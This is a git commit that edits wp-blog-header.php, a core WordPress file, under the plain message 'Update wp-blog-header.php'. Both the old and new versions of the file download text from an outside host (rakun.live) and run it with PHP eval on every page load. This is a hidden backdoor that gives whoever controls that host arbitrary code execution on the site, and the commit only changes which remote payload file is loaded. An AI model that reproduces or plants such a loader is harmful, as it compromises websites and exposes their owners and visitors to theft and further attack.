6ff68bd267888cd43d708e383377fc5f9d51f952
batskulah <alfanpekan@gmail.com>
2025-12-18 21:28:19 +0700

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/iaph.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/apisss.txt'));
 $url = "?> ".$url;
 eval($url);
 
